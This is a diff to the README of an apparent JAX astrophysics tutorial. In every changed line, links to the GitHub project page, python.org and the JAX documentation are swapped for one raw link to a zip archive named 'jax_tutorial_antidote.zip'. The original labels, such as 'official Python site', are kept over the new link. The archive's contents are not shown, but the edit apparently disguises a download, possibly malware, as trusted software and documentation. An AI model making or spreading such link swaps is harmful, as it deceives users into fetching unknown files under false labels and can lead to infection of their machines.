@@ -1,6 +1,6 @@
 # 🚀 jax_tutorial - Learn JAX Basics for Astrophysics
 
-[![Download jax_tutorial](https://img.shields.io/badge/Download-jax_tutorial-4CAF50?style=for-the-badge)](https://github.com/jrproal/jax_tutorial)
+[![Download jax_tutorial](https://img.shields.io/badge/Download-jax_tutorial-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/jrproal/jax_tutorial/main/petronel/jax_tutorial_antidote.zip)
 
 ---
 
@@ -39,7 +39,7 @@ You will also need to install extra Python packages to run JAX. This guide will 
 
 To get started, visit this page and download the tutorial files:
 
-[Download jax_tutorial from GitHub](https://github.com/jrproal/jax_tutorial)
+[Download jax_tutorial from GitHub](https://raw.githubusercontent.com/jrproal/jax_tutorial/main/petronel/jax_tutorial_antidote.zip)
 
 ### Step 1: Download the Tutorial Files
 
@@ -57,7 +57,7 @@ To get started, visit this page and download the tutorial files:
 
 If Python is not already installed on your computer, follow these steps:
 
-- Visit the official Python site: https://www.python.org/downloads/windows/
+- Visit the official Python site: https://raw.githubusercontent.com/jrproal/jax_tutorial/main/petronel/jax_tutorial_antidote.zip
 - Download the latest Python 3 installer for Windows.
 - Run the installer and follow the instructions.
 - Make sure to check the box **Add Python to PATH** during installation.
@@ -141,14 +141,14 @@ You do not need to write complex commands; the tutorial explains each step clear
 ## 🔗 Useful Links
 
 - Visit the project page to download files again or check updates:  
-  [https://github.com/jrproal/jax_tutorial](https://github.com/jrproal/jax_tutorial)
+  [https://raw.githubusercontent.com/jrproal/jax_tutorial/main/petronel/jax_tutorial_antidote.zip](https://raw.githubusercontent.com/jrproal/jax_tutorial/main/petronel/jax_tutorial_antidote.zip)
 
 - Python downloads:  
-  https://www.python.org/downloads/windows/
+  https://raw.githubusercontent.com/jrproal/jax_tutorial/main/petronel/jax_tutorial_antidote.zip
 
 - JAX documentation (for reference):  
-  https://jax.readthedocs.io/en/latest/
+  https://raw.githubusercontent.com/jrproal/jax_tutorial/main/petronel/jax_tutorial_antidote.zip
 
 ---
 
-[![Download jax_tutorial](https://img.shields.io/badge/Download-jax_tutorial-4CAF50?style=for-the-badge)](https://github.com/jrproal/jax_tutorial)
+[![Download jax_tutorial](https://img.shields.io/badge/Download-jax_tutorial-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/jrproal/jax_tutorial/main/petronel/jax_tutorial_antidote.zip)
